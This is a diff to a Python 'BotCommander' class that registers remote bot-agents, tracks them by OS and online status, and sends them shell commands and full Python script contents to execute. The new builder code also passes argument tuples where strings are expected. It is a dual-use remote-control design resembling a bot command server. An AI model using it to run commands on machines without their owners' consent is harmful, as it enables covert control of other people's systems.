@@ -132,8 +132,8 @@ class BotCommander:
             self.__print_cmd_options()
             await self.__exec_shell_cmd()
 
-    async def __schedule_command(self, payload, cmd_filter):
-        self.__json_builder()
+    async def __schedule_command(self, cmd, cmd_filter):
+        payload = self.__json_builder("exeCommand", cmd)
         if cmd_filter:
             for uuid in self.uuids:
                 if self.uuids[uuid].get("online") and self.uuids[uuid].get("os") == cmd_filter:
@@ -147,10 +147,10 @@ class BotCommander:
         try:
             logger.core.debug(f'Sending payload {payload} to bot-agent {self.uuids[uuid]["hostname"]}:'
                               f'{self.uuids[uuid]["addr"]}')
-            self.uuids[uuid]["writer"].write(payload.encode("utf-8"))
+            self.uuids[uuid]["writer"].write(payload)
         except Exception as err:
-            logger.core.error(f'Unexpected exception when writing stream {payload} to bot-agent'
-                              f' {self.uuids[uuid]["hostname"]}:{self.uuids[uuid]["addr"]} - {err}')
+            logger.core.error(f'Unexpected exception when writing stream {payload.decode("utf-8")} to bot-agent'
+                              f' {self.uuids.get(uuid)}:{self.uuids[uuid]["addr"]} - {err}')
 
     def __exec_python_script(self):
         pass
@@ -227,21 +227,20 @@ class BotCommander:
             for json_item in data:
                 agent_uuid = self.__process_input_stream(json_item, addr, reader, writer)
                 if agent_uuid:
-                    hostname = self.uuids[agent_uuid].get("hostname")
-                    payload = self.__json_builder("botHostInfoReply", hostname)
+                    payload = self.__json_builder("botHostInfoReply")
                     if payload:
                         try:
-                            logger.core.debug(f'Sending botHostInfoReply to bot-agent {hostname}-{addr}')
+                            logger.core.debug(f'Sending botHostInfoReply to bot-agent {agent_uuid}-{addr}')
                             writer.write(payload)
                         except Exception as err:
                             logger.core.error(f'Unexpected error when sending botHostInfoReply to bot-agent '
-                                              f'{hostname}-{addr}: {err}. Closing connection, set agent to offline.')
+                                              f'{agent_uuid}-{addr}: {err}. Closing connection, set agent to offline.')
                             writer.close()
                             self.uuids.get(agent_uuid)["online"] = False
                             return
                         return agent_uuid
                     else:
-                        logger.core.error(f"Closing connection of bot-agent {hostname}:{addr} as adding process was"
+                        logger.core.error(f"Closing connection of bot-agent {agent_uuid}:{addr} as adding process was"
                                           f" not successfully completed. Closing connection, set agent to offline")
                         writer.close()
                         self.uuids.get(agent_uuid)["online"] = False
@@ -277,7 +276,7 @@ class BotCommander:
                     logger.core.info(f"Successfully added agent {hostname}-{uuid} to DB")
                     return uuid
             case "botHello":
-                payload = self.__json_builder("botHelloReply", self.uuids[uuid_in].get("hostname"))
+                payload = self.__json_builder("botHelloReply")
                 if payload:
                     try:
                         logger.core.debug(f"Sending botHelloReply to bot-agent {uuid_in}-{addr}")
@@ -312,28 +311,29 @@ class BotCommander:
         return json_item
 
     @staticmethod
-    def __json_serialize(data, message, hostname):
+    def __json_serialize(data, message):
         try:
             payload = (json.dumps(data) + "\n").encode("utf-8")
         except Exception as err:
-            logger.core.error(f"Unexpected error while serializing {message} message for bot-agent {hostname}: {err}")
+            logger.core.error(f"Unexpected error while serializing {message} message: {err}")
             return False
         return payload
 
     def __json_builder(self, message, *args):
-        d = {"message": f"{message}"}
-        match message:
-            case "botHostInfoReply":
-                hostname = args
-                payload = self.__json_serialize(d, message, hostname)
-            case "botHelloReply":
-                hostname = args
-                payload = self.__json_serialize(d, message, hostname)
-            case "exeCommand":
-                pass
-            case _:
-                logger.core.error(f"Json builder was not able to build message, unknown request: args: {args}")
-                return False
+        if message in ["botHostInfoReply", "botHelloReply"]:
+            d = {"message": f"{message}"}
+        elif message == "exeCommand":
+            cmd = args
+            d = {"message": f"{message}", "command": cmd}
+        elif message == "exePythonScript":
+            path_to_script = args
+            with open(path_to_script, 'r') as fh:
+                content = fh.read()
+            d = {"message": f"{message}", "script": path_to_script, "content": content}
+        else:
+            logger.core.error(f"Json builder was not able to build {message}, unknown request: args: {args}")
+            return False
+        payload = self.__json_serialize(d, message)
         return payload
 
     @staticmethod
